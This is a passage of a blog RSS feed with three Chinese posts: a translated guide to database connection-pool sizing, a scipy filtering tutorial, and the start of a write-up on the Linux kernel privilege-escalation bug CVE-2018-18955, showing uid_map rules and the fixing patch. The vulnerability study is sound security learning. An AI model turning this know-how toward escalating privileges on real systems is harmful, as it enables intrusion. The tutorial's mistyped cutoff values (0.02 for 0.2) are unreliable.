&lt;p&gt;PS: 这里有一个 Oracle 性能小组发布的简短视频，链接地址为 &lt;a href=&quot;http://www.dailymotion.com/video/x2s8uec&quot; class=&quot;uri&quot;&gt;http://www.dailymotion.com/video/x2s8uec&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https://exception-image-bucket.oss-cn-hangzhou.aliyuncs.com/155723380086955&quot; title=&quot;oracle性能测试视频&quot; alt=&quot;oracle性能测试视频&quot;/&gt;&lt;/p&gt;
&lt;p&gt;口述一下，视频中对 Oracle 数据库进行了压力测试，模拟 9600 个并发线程来操作数据库，每两次数据库操作之间 sleep 550ms，注意，视频中刚开始设置的线程池大小为 2048。&lt;/p&gt;
&lt;p&gt;让我们来看看数据库连接池的大小为 2048 性能测试结果的鬼样子：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;每个请求要在连接池队列里等待 33ms，获得连接之后，执行SQL需要耗时77ms, CPU 消耗维持在 95% 左右；&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;接下来，我们将连接池的大小改小点，设置成 1024，其他测试参数不变，结果咋样？&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&quot;这里，获取连接等待时长基本不变，但是 SQL 的执行耗时降低了！&quot;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;哎呦，有长进哦！&lt;/p&gt;
&lt;p&gt;接下来，我们再设置小些，连接池的大小降低到 96，并发数等其他参数不变，看看结果如何：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;每个请求在连接池队列中的平均等待时间为 1ms, SQL 执行耗时为 2ms&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;我去！什么鬼？&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;我们没调整任何东西，仅仅只是将数据库连接池的大小降低了，这样，就能把之前平均 100ms 响应时间缩短到了 3ms。吞吐量指数级上升啊！&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;你这也太溜了！&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://exception-image-bucket.oss-cn-hangzhou.aliyuncs.com/155715088554575&quot; title=&quot;吃惊&quot; alt=&quot;吃惊&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;四为啥有这种效果&quot;&gt;四、为啥有这种效果?&lt;/h2&gt;
&lt;p&gt;我们不妨想一下，为啥 Nginx 内部仅仅使用了 4 个线程，其性能就大大超越了 100 个进程的 Apache HTTPD 呢？追究其原因的话，回想一下计算机科学的基础知识，答案其实非常明显。&lt;/p&gt;
&lt;p&gt;要知道，即使是单核 CPU 的计算机也能“同时”运行着数百个线程。但我们其实都知道，这只不过是操作系统快速切换时间片，跟我们玩的一个小把戏罢了。&lt;/p&gt;
&lt;p&gt;一核 CPU同一时刻只能执行一个线程，然后操作系统切换上下文，CPU 核心快速调度，执行另一个线程的代码，不停反复，给我们造成了所有进程同时运行假象。&lt;/p&gt;
&lt;p&gt;其实，在一核 CPU 的机器上，顺序执行&lt;strong&gt;A&lt;/strong&gt;和&lt;strong&gt;B&lt;/strong&gt;永远比通过时间分片切换“同时”执行&lt;strong&gt;A&lt;/strong&gt;和&lt;strong&gt;B&lt;/strong&gt;要快，其中原因，学过操作系统这门课程的童鞋应该很清楚。一旦线程的数量超过了 CPU 核心的数量，再增加线程数系统就只会更慢，而不是更快，因为这里涉及到上下文切换耗费的额外的性能。&lt;/p&gt;
&lt;p&gt;说到这里，你应该恍然大悟了 ……&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://exception-image-bucket.oss-cn-hangzhou.aliyuncs.com/155715141400931&quot; title=&quot;我懂了&quot; alt=&quot;我懂了&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;五其他应该考虑到的因素&quot;&gt;五、其他应该考虑到的因素&lt;/h2&gt;
&lt;p&gt;上小节中说到了主要原因，但其实没有这么简单，我们还需要考虑到一些其他的因素。&lt;/p&gt;
&lt;p&gt;当我们在寻找数据库的性能瓶颈时，大致可归为三类：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;CPU&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;磁盘 IO&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;网络 IO&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;也许你会说，还有内存这一因素？内存的确是需要考虑的，但是比起&lt;strong&gt;磁盘IO&lt;/strong&gt;和&lt;strong&gt;网络IO&lt;/strong&gt;，稍显微不足道，这里就不加了。&lt;/p&gt;
&lt;p&gt;假设我们不考虑磁盘 IO 和网络 IO，就很好定论了，在一个 8 核的服务器上，数据库连接数/线程数设置为 8 能够提供最优的性能，如果再增加连接数，反而会因为上下文切换导致性能下降。&lt;/p&gt;
&lt;p&gt;大家都知道，数据库通常把数据存储在磁盘上，而磁盘呢，通常是由一些旋转着的金属碟片和一个装在步进马达上的读写头组成的。读/写头同一时刻只能出现在一个位置，当它需要再次执行读写操作时，它必须“寻址”到另外一个位置才能完成任务。所以呢？这里就有了&lt;strong&gt;寻址的耗时&lt;/strong&gt;，此外还有&lt;strong&gt;旋转耗时&lt;/strong&gt;，读写头需要等待磁盘碟片上的目标数据“旋转到位”才能进行读写操作。使用缓存当然是能够提升性能的，但上述原理仍然适用。&lt;/p&gt;
&lt;p&gt;在这段（&quot;I/O等待&quot;）时间内，线程是处于“阻塞”等待状态，也就是说没干啥正事！此时操作系统可以将这个空闲的CPU 核心用于服务其他线程。&lt;/p&gt;
&lt;p&gt;这里我们可以总结一下，当你的线程处理的是 I/O 密集型业务时，便可以让线程/连接数设置的比 CPU核心大一些，这样就能够在同样的时间内，完成更多的工作，提升吞吐量。&lt;/p&gt;
&lt;p&gt;那么问题又来了？&lt;/p&gt;
&lt;p&gt;大小设置成多少合适呢？&lt;/p&gt;
&lt;p&gt;这要取决于&lt;strong&gt;磁盘&lt;/strong&gt;，如果你使用的是 SSD 固态硬盘，它不需要寻址，也不需要旋转碟片。打住打住！！！你千万可别理所当然的认为：“&lt;strong&gt;既然SSD速度更快，我们把线程数的大小设置的大些吧！！&lt;/strong&gt;”&lt;/p&gt;
&lt;p&gt;结论正好相反！无需寻址和没有旋回耗时的确意味着&lt;strong&gt;更少的阻塞&lt;/strong&gt;，所以更少的线程（更接近于CPU核心数）会发挥出更高的性能。只有当阻塞密集时，更多的线程数才能发挥出更好的性能。&lt;/p&gt;
&lt;p&gt;上面我们已经说过了磁盘 IO, 接下来我们谈谈网络 IO！&lt;/p&gt;
&lt;p&gt;网络 IO 其实也是非常相似的。通过以太网接口读写数据时也会造成阻塞，10G带宽会比1G带宽的阻塞耗时少一些，而 1G 带宽又会比 100M 带宽的阻塞少一些。通常情况下，我们把网络 IO 放在第三顺位来考虑，然而有些人会在性能计算中忽略网络 IO 带来的影响。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://exception-image-bucket.oss-cn-hangzhou.aliyuncs.com/155723152712170&quot; title=&quot;PostgreSQL的benchmark数据&quot; alt=&quot;PostgreSQL的benchmark数据&quot;/&gt;&lt;/p&gt;
&lt;p&gt;上图是 PostgreSQL 的基准性能测试数据，从图中我们可以看到，TPS 在连接数达到 50 时开始变缓。回过头来想下，在上面 Oracle 的性能测试视频中，测试人员们将连接数从 2048 降到了 96，实际上 96 还是太高了，除非你的服务器 CPU 核心数有 16 或 32。&lt;/p&gt;
&lt;h2 id=&quot;六连接数计算公式&quot;&gt;六、连接数计算公式&lt;/h2&gt;
&lt;p&gt;下面公式由 PostgreSQL 提供，不过底层原理是不变的，它适用于市面上绝大部分数据库产品。还有，你应该模拟预期的访问量，并通过下面的公式先设置一个偏合理的值，然后在实际的测试中，通过微调，来寻找最合适的连接数大小。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;连接数 = ((核心数 * 2) + 有效磁盘数)&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote readability=&quot;8&quot;&gt;
&lt;p&gt;核心数不应包含超线程(hyper thread)，即使打开了超线程也是如此，如果热点数据全被缓存了，那么有效磁盘数实际是0，随着缓存命中率的下降，有效磁盘数也逐渐趋近于实际的磁盘数。另外需要注意，这一公式作用于SSD 的效果如何，尚未明了。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;好了，按照这个公式，如果说你的服务器 CPU 是 4核 i7 的，连接池大小应该为 &lt;code&gt;((4 * 2) + 1) = 9&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;取个整, 我们就设置为 10 吧。你这个行不行啊？10 也太小了吧！&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://exception-image-bucket.oss-cn-hangzhou.aliyuncs.com/155723263840076&quot; title=&quot;行不行啊&quot; alt=&quot;行不行啊&quot;/&gt;&lt;/p&gt;
&lt;p&gt;你要是觉得不太行的话，可以跑个性能测试看看，我们可以保证，它能轻松支撑 3000 用户以 6000 TPS 的速率并发执行简单查询的场景。你还可以将连接池大小超过 10，那时，你会看到响应时长开始增加，TPS 开始下降。&lt;/p&gt;
&lt;h2 id=&quot;七结论你需要的是一个小连接池和一个等待连接的线程队列&quot;&gt;七、结论：你需要的是一个小连接池，和一个等待连接的线程队列&lt;/h2&gt;
&lt;p&gt;假设说你有 10000 个并发访问，而你设置了连接池大小为 10000，你怕是石乐志哦。&lt;/p&gt;
&lt;p&gt;改成 1000，太高？改成 100？还是太多了。&lt;/p&gt;
&lt;p&gt;你仅仅需要一个大小为 10 数据库连接池，然后让剩下的业务线程都在队列里等待就可以了。&lt;/p&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;连接池中的连接数量大小应该设置成：数据库能够有效同时进行的查询任务数（通常情况下来说不会高于 2*CPU核心数）。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;你应该经常会看到一些用户量不是很大的 web 应用中，为应付大约十来个的并发，却将数据库连接池设置成 100， 200 的情况。请不要过度配置您的数据库连接池的大小。&lt;/p&gt;
&lt;h2 id=&quot;八额外需要注意的点&quot;&gt;八、额外需要注意的点&lt;/h2&gt;
&lt;p&gt;实际上，连接池的大小的设置还是要结合实际的业务场景来说事。&lt;/p&gt;
&lt;p&gt;比如说，你的系统同时混合了&lt;strong&gt;长事务&lt;/strong&gt;和&lt;strong&gt;短事务&lt;/strong&gt;，这时，根据上面的公式来计算就很难办了。正确的做法应该是创建两个连接池，一个服务于长事务，一个服务于&quot;实时&quot;查询，也就是短事务。&lt;/p&gt;
&lt;p&gt;还有一种情况，比方说一个系统执行一个任务队列，业务上要求同一时间内只允许执行一定数量的任务，这时，我们就应该让并发任务数去适配连接池连接数，而不是连接数大小去适配并发任务数。&lt;/p&gt;
&lt;h2 id=&quot;ref&quot;&gt;Ref&lt;/h2&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/brettwooldridge/HikariCP/wiki/About-Pool-Sizing&quot; class=&quot;uri&quot;&gt;https://github.com/brettwooldridge/HikariCP/wiki/About-Pool-Sizing&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;免费分享-面试学习福利资源&quot;&gt;免费分享 | 面试&amp;amp;学习福利资源&lt;/h2&gt;
&lt;p&gt;最近在网上发现一个不错的 PDF 资源《Java 核心知识&amp;amp;面试.pdf》分享给大家，不光是面试，学习，你都值得拥有！！！&lt;/p&gt;
&lt;p&gt;获取方式: 关注公众号: &lt;strong&gt;小哈学Java&lt;/strong&gt;, 后台回复&lt;strong&gt;资源&lt;/strong&gt;，既可&lt;strong&gt;免费无套路获取资源链接&lt;/strong&gt;，下面是目录以及部分截图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://exception-image-bucket.oss-cn-hangzhou.aliyuncs.com/155651432676587&quot; title=&quot;关注微信公众号【小哈学Java】,回复【资源】，即可免费无套路领取资源链接哦&quot; alt=&quot;关注微信公众号【小哈学Java】,回复【资源】，即可免费无套路领取资源链接哦&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://exception-image-bucket.oss-cn-hangzhou.aliyuncs.com/155651441280253&quot; title=&quot;关注微信公众号【小哈学Java】,回复【资源】，即可免费无套路领取资源链接哦&quot; alt=&quot;关注微信公众号【小哈学Java】,回复【资源】，即可免费无套路领取资源链接哦&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://exception-image-bucket.oss-cn-hangzhou.aliyuncs.com/155651443805696&quot; title=&quot;关注微信公众号【小哈学Java】,回复【资源】，即可免费无套路领取资源链接哦&quot; alt=&quot;关注微信公众号【小哈学Java】,回复【资源】，即可免费无套路领取资源链接哦&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://exception-image-bucket.oss-cn-hangzhou.aliyuncs.com/155651470347464&quot; title=&quot;关注微信公众号【小哈学Java】,回复【资源】，即可免费无套路领取资源链接哦&quot; alt=&quot;关注微信公众号【小哈学Java】,回复【资源】，即可免费无套路领取资源链接哦&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://exception-image-bucket.oss-cn-hangzhou.aliyuncs.com/155651449186666&quot; title=&quot;关注微信公众号【小哈学Java】,回复【资源】，即可免费无套路领取资源链接哦&quot; alt=&quot;关注微信公众号【小哈学Java】,回复【资源】，即可免费无套路领取资源链接哦&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://exception-image-bucket.oss-cn-hangzhou.aliyuncs.com/155651451040055&quot; title=&quot;关注微信公众号【小哈学Java】,回复【资源】，即可免费无套路领取资源链接哦&quot; alt=&quot;关注微信公众号【小哈学Java】,回复【资源】，即可免费无套路领取资源链接哦&quot;/&gt;&lt;/p&gt;
&lt;p&gt;重要的事情说两遍，关注公众号: &lt;strong&gt;小哈学Java&lt;/strong&gt;, 后台回复&lt;strong&gt;资源&lt;/strong&gt;，既可&lt;strong&gt;免费无套路获取资源链接&lt;/strong&gt; ！！！&lt;/p&gt;
&lt;h2 id=&quot;欢迎关注微信公众号-小哈学java&quot;&gt;欢迎关注微信公众号: 小哈学Java&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://exception-image-bucket.oss-cn-hangzhou.aliyuncs.com/155634562788477&quot; title=&quot;关注微信公众号【小哈学Java】,回复【资源】，即可免费无套路领取资源链接哦&quot; alt=&quot;关注微信公众号【小哈学Java】,回复【资源】，即可免费无套路领取资源链接哦&quot;/&gt;&lt;/p&gt;
</description>
<pubDate>Wed, 08 May 2019 07:14:00 +0000</pubDate>
<dc:creator>犬小哈</dc:creator>
<og:description>文章翻译整理自: 'https://github.com/brettwooldridge/HikariCP/wiki/About Pool Sizing' 欢迎关注个人微信公众号: 小哈学Java ,</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/quanxiaoha/p/10832014.html</dc:identifier>
</item>
<item>
<title>[开发技巧]·Python实现信号滤波（基于scipy） - 小宋是呢</title>
<link>http://www.cnblogs.com/xiaosongshine/p/10831931.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/xiaosongshine/p/10831931.html</guid>
<description>&lt;h3&gt; &lt;/h3&gt;
&lt;blockquote readability=&quot;2.6630434782609&quot;&gt;
&lt;p&gt;个人网站--&amp;gt; &lt;a href=&quot;http://www.yansongsong.cn/&quot; data-cke-saved-href=&quot;http://www.yansongsong.cn/&quot;&gt;http://www.yansongsong.cn&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;GitHub主页--&amp;gt; &lt;a href=&quot;https://github.com/xiaosongshine/dlib_face_recognition&quot; data-cke-saved-href=&quot;https://github.com/xiaosongshine/dlib_face_recognition&quot;&gt;https://github.com/xiaosongshine&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3&gt;&lt;span class=&quot;cke_widget_wrapper cke_widget_inline cke_widget_image cke_image_nocaption cke_widget_selected&quot; data-cke-widget-wrapper=&quot;1&quot; data-cke-filter=&quot;off&quot; data-cke-display-name=&quot;图像&quot; data-cke-widget-id=&quot;18&quot;&gt;&lt;img class=&quot;cke_widget_element has&quot; src=&quot;https://img-blog.csdnimg.cn/20190508150009791.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW9zb25nc2hpbmU=,size_16,color_FFFFFF,t_70&quot; alt=&quot;&quot; data-cke-widget-keep-attr=&quot;0&quot; data-widget=&quot;image&quot; data-cke-widget-data=&quot;{&amp;amp;quot;hasCaption&amp;amp;quot;:false,&amp;amp;quot;src&amp;amp;quot;:&amp;amp;quot;https://img-blog.csdnimg.cn/20190508150009791.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW9zb25nc2hpbmU=,size_16,color_FFFFFF,t_70&amp;amp;quot;,&amp;amp;quot;alt&amp;amp;quot;:&amp;amp;quot;&amp;amp;quot;,&amp;amp;quot;width&amp;amp;quot;:&amp;amp;quot;&amp;amp;quot;,&amp;amp;quot;height&amp;amp;quot;:&amp;amp;quot;&amp;amp;quot;,&amp;amp;quot;lock&amp;amp;quot;:false,&amp;amp;quot;align&amp;amp;quot;:&amp;amp;quot;none&amp;amp;quot;,&amp;amp;quot;classes&amp;amp;quot;:[]}&quot; data-cke-saved-src=&quot;https://img-blog.csdnimg.cn/20190508150009791.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW9zb25nc2hpbmU=,size_16,color_FFFFFF,t_70&quot;/&gt;&lt;span class=&quot;cke_reset cke_widget_drag_handler_container&quot;&gt;&lt;img class=&quot;cke_reset cke_widget_drag_handler&quot; title=&quot;点击并拖拽以移动&quot; src=&quot;data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==&quot; alt=&quot;&quot; width=&quot;15&quot; height=&quot;15&quot; data-cke-widget-drag-handler=&quot;1&quot;/&gt;&lt;span class=&quot;cke_image_resizer&quot; title=&quot;点击并拖拽以改变尺寸&quot;&gt;​&lt;br/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;h3&gt;1.背景介绍&lt;/h3&gt;

&lt;p&gt;在深度学习中，有时会使用Matlab进行滤波处理，再将处理过的数据送入神经网络中。这样是一般的处理方法，但是处理起来却有些繁琐，并且有时系统难以运行Matlab。Python作为一种十分强大的语言，是支持信号滤波滤波处理的。&lt;/p&gt;
&lt;p&gt;本文将以实战的形式基于scipy模块使用Python实现简单滤波处理，包括内容有&lt;strong&gt;1.低通滤波，2.高通滤波，3.带通滤波，4.带阻滤波器&lt;/strong&gt;。具体的含义大家可以查阅大学课程，信号与系统。简单的理解就是低通滤波指的是去除高于某一阈值频率的信号；高通滤波去除低于某一频率的信号；带通滤波指的是类似低通高通的结合保留中间频率信号；带阻滤波也是低通高通的结合只是过滤掉的是中间部分。上面所说的内容会在实战部分加以介绍，可以对比理解一下。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;如何实现的呢？&lt;/strong&gt;我的理解，是通过时域转换为频域，在频域信号中去除相应频域信号，最后在逆转换还原为时域型号。具体的内容还是要查阅大学课程，信号与系统。自己学的很一般就不班门弄斧了。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;有什么作用呢？&lt;/strong&gt;My Opinions，可以消除一些干扰信号，以低通滤波为例，例如我们如果只是统计脉搏信号波形，应该在1Hz左右，却发现波形信号上有很多噪音，这些噪音都是成百上千Hz的，这些对于脉搏信号波形就属于无用的噪音，我们就可以通过低通滤波器将超出某一阈值的信号过滤掉，此时得到的波形就会比较平滑了。&lt;/p&gt;

&lt;h3&gt;2.实战演练&lt;/h3&gt;
&lt;p&gt;首先我们使用到了scipy模块，可以通过下述命令进行安装：（我使用的Python==3.6）&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;1).低通滤波&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;这里假设采样频率为1000hz,信号本身最大的频率为500hz，要滤除400hz以上频率成分，即截至频率为400hz,则wn=2*400/1000=0.8。Wn=0.8&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;2).高通滤波&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;这里假设采样频率为1000hz,信号本身最大的频率为500hz，要滤除100hz以下频率成分，即截至频率为100hz,则wn=2*100/1000=0.2。Wn=0.2&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;38&quot;&gt;
&lt;pre class=&quot;brush:python;gutter:true;&quot;&gt;
from scipy import signal

b, a = signal.butter(8, 0.2, 'highpass')   #配置滤波器 8 表示滤波器的阶数
filtedData = signal.filtfilt(b, a, data)  #data为要过滤的信号
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;3).带通滤波&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;这里假设采样频率为1000hz,信号本身最大的频率为500hz，要滤除100hz以下，400hz以上频率成分，即截至频率为100，400hz,则wn1=2*100/1000=0.2，Wn1=0.2； wn2=2*400/1000=0.8，Wn2=0.8。Wn=[0.02,0.8]&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;4).带阻滤波&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;这里假设采样频率为1000hz,信号本身最大的频率为500hz，要滤除100hz以上，400hz以下频率成分，即截至频率为100，400hz,则wn1=2*100/1000=0.2，Wn1=0.2； wn2=2*400/1000=0.8，Wn2=0.8。Wn=[0.02,0.8]，和带通相似，但是带通是保留中间，而带阻是去除。&lt;/p&gt;

&lt;h3&gt;3.函数介绍 &lt;/h3&gt;
&lt;p&gt;1.函数的介绍&lt;/p&gt;
&lt;p&gt;(1).滤波函数&lt;/p&gt;
&lt;blockquote readability=&quot;39&quot;&gt;
&lt;p&gt;scipy.signal.filtfilt(b, a, x, axis=-1, padtype='odd', padlen=None, method='pad', irlen=None)&lt;/p&gt;
&lt;p&gt;输入参数：&lt;/p&gt;
&lt;p&gt;b: 滤波器的分子系数向量&lt;/p&gt;
&lt;p&gt;a: 滤波器的分母系数向量&lt;/p&gt;
&lt;p&gt;x: 要过滤的数据数组。（array型）&lt;/p&gt;
&lt;p&gt;axis: 指定要过滤的数据数组x的轴&lt;/p&gt;
&lt;p&gt;padtype: 必须是“奇数”、“偶数”、“常数”或“无”。这决定了用于过滤器应用的填充信号的扩展类型。{‘odd’, ‘even’, ‘constant’, None}&lt;/p&gt;
&lt;p&gt;padlen：在应用滤波器之前在轴两端延伸X的元素数目。此值必须小于要滤波元素个数- 1。（int型或None）&lt;/p&gt;
&lt;p&gt;method：确定处理信号边缘的方法。当method为“pad”时，填充信号；填充类型padtype和padlen决定，irlen被忽略。当method为“gust”时，使用古斯塔夫森方法，而忽略padtype和padlen。{“pad” ，“gust”}&lt;/p&gt;
&lt;p&gt;irlen：当method为“gust”时，irlen指定滤波器的脉冲响应的长度。如果irlen是None，则脉冲响应的任何部分都被忽略。对于长信号，指定irlen可以显著改善滤波器的性能。（int型或None）&lt;/p&gt;
&lt;p&gt;输出参数：&lt;/p&gt;
&lt;p&gt;y:滤波后的数据数组&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;（2）.滤波器构造函数(仅介绍Butterworth滤波器)&lt;/p&gt;
&lt;blockquote readability=&quot;33&quot;&gt;
&lt;p&gt;scipy.signal.butter(N, Wn, btype='low', analog=False, output='ba')&lt;/p&gt;
&lt;p&gt;输入参数：&lt;/p&gt;
&lt;p&gt;N:滤波器的阶数&lt;/p&gt;
&lt;p&gt;Wn：归一化截止频率。计算公式Wn=2*截止频率/采样频率。（注意：根据采样定理，采样频率要大于两倍的信号本身最大的频率，才能还原信号。截止频率一定小于信号本身最大的频率，所以Wn一定在0和1之间）。当构造带通滤波器或者带阻滤波器时，Wn为长度为2的列表。&lt;/p&gt;
&lt;p&gt;btype : 滤波器类型{‘lowpass’, ‘highpass’, ‘bandpass’, ‘bandstop’},&lt;/p&gt;
&lt;p&gt;output : 输出类型{‘ba’, ‘zpk’, ‘sos’},&lt;/p&gt;
&lt;p&gt;输出参数：&lt;/p&gt;
&lt;p&gt;b，a: IIR滤波器的分子（b）和分母（a）多项式系数向量。output='ba'&lt;/p&gt;
&lt;p&gt;z,p,k: IIR滤波器传递函数的零点、极点和系统增益. output= 'zpk'&lt;/p&gt;
&lt;p&gt;sos: IIR滤波器的二阶截面表示。output= 'sos'&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3&gt;&lt;br/&gt;4.参考&lt;/h3&gt;
&lt;blockquote readability=&quot;10&quot;&gt;
&lt;p&gt;https://blog.csdn.net/weixin_37996604/article/details/82864680 &lt;/p&gt;
&lt;p&gt;https://docs.scipy.org/doc/scipy-0.18.1/reference/generated/scipy.signal.filtfilt.html&lt;/p&gt;
&lt;p&gt;https://docs.scipy.org/doc/scipy-0.18.1/reference/generated/scipy.signal.butter.html#scipy.signal.butter&lt;/p&gt;
&lt;/blockquote&gt;
</description>
<pubDate>Wed, 08 May 2019 07:04:00 +0000</pubDate>
<dc:creator>小宋是呢</dc:creator>
<og:description>[开发技巧]·Python实现信号滤波（基于scipy） 个人网站--&gt; http://www.yansongsong.cn GitHub主页--&gt; http</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/xiaosongshine/p/10831931.html</dc:identifier>
</item>
<item>
<title>CVE-2018-18955漏洞学习 - 番茄汁汁</title>
<link>http://www.cnblogs.com/likaiming/p/10816529.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/likaiming/p/10816529.html</guid>
<description>&lt;p&gt;&lt;code class=&quot;bash plain&quot;&gt;$&lt;/code&gt; &lt;code class=&quot;bash functions&quot;&gt;cat&lt;/code&gt; &lt;code class=&quot;bash plain&quot;&gt;/proc/2465/uid_map&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;bash plain&quot;&gt;0       1000          1&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;而向这两个文件中写值的时候有一些限制，在linux4.14之前只能写入5行，在4.15之后，可以达到340行&lt;/p&gt;
&lt;div class=&quot;line number2 index1 alt1&quot;&gt;
&lt;ul&gt;&lt;li&gt;写这两个文件的进程需要这个namespace中的CAP_SETUID (CAP_SETGID)权限（可参看&lt;a href=&quot;http://man7.org/linux/man-pages/man7/capabilities.7.html&quot; target=&quot;_blank&quot;&gt;Capabilities&lt;/a&gt;）&lt;/li&gt;
&lt;li&gt;写入的进程必须是此user namespace的父或子的user namespace进程。&lt;/li&gt;
&lt;li&gt;另外需要满如下条件之一：1）父进程将effective uid/gid映射到子进程的user namespace中，2）父进程如果有CAP_SETUID/CAP_SETGID权限，那么它将可以映射到父进程中的任一uid/gid。&lt;/li&gt;
&lt;/ul&gt;&lt;/div&gt;

&lt;p&gt;这个漏洞的修补在&lt;a href=&quot;https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=d2f007dbe7e4c9583eea6eb04d60001e85c6f1bd&quot; target=&quot;_blank&quot;&gt;这里&lt;/a&gt;，问题出在kernel/user_namespace.c中的map_write之中：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;49&quot;&gt;
&lt;pre&gt;
diff --git a/kernel/user_namespace.c b/kernel/&lt;span&gt;user_namespace.c
index e5222b5..923414a &lt;/span&gt;&lt;span&gt;100644&lt;/span&gt;
--- a/kernel/&lt;span&gt;user_namespace.c
&lt;/span&gt;+++ b/kernel/&lt;span&gt;user_namespace.c
@@ &lt;/span&gt;-&lt;span&gt;974&lt;/span&gt;,&lt;span&gt;10&lt;/span&gt; +&lt;span&gt;974&lt;/span&gt;,&lt;span&gt;6&lt;/span&gt; @@ &lt;span&gt;static&lt;/span&gt; ssize_t map_write(&lt;span&gt;struct&lt;/span&gt; file *file, &lt;span&gt;const&lt;/span&gt; &lt;span&gt;char&lt;/span&gt; __user *&lt;span&gt;buf,
     &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (!new_idmap_permitted(file, ns, cap_setid, &amp;amp;&lt;span&gt;new_map))
         &lt;/span&gt;&lt;span&gt;goto&lt;/span&gt; &lt;span&gt;out&lt;/span&gt;&lt;span&gt;;
 
&lt;/span&gt;-    ret = sort_idmaps(&amp;amp;&lt;span&gt;new_map);
&lt;/span&gt;-    &lt;span&gt;if&lt;/span&gt; (ret &amp;lt; &lt;span&gt;0&lt;/span&gt;&lt;span&gt;)
&lt;/span&gt;-        &lt;span&gt;goto&lt;/span&gt; &lt;span&gt;out&lt;/span&gt;&lt;span&gt;;
&lt;/span&gt;-&lt;span&gt;
     ret &lt;/span&gt;= -&lt;span&gt;EPERM;
     &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; Map the lower ids from the parent user namespace to the
      * kernel global id space.
@@ -1004,6 +1000,14 @@ static ssize_t map_write(struct file *file, const char __user *buf,
         e-&amp;gt;lower_first = lower_first;
     }
 
+    /*
+     * If we want to use binary search for lookup, this clones the extent
+     * array and sorts both copies.
+     &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
+    ret = sort_idmaps(&amp;amp;&lt;span&gt;new_map);
&lt;/span&gt;+    &lt;span&gt;if&lt;/span&gt; (ret &amp;lt; &lt;span&gt;0&lt;/span&gt;&lt;span&gt;)
&lt;/span&gt;+        &lt;span&gt;goto&lt;/span&gt; &lt;span&gt;out&lt;/span&gt;&lt;span&gt;;
&lt;/span&gt;+
     &lt;span&gt;/*&lt;/span&gt;&lt;span&gt; Install the map &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
